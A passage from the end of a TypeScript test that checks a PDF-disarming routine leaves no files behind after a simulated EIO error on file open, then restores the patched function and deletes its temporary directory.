      expect({ struck, code: (error as NodeJS.ErrnoException | undefined)?.code, status: error ? undefined : (r as PdfDisarmResult).status, left: fs.readdirSync(dir) }).to.deep.equal({
        struck: 1,
        code: 'EIO',
        status: undefined,
        left: [],
      });
    } finally {
      fspm.open = real;
      fs.rmSync(dir, { recursive: true, force: true });
    }
  });
});
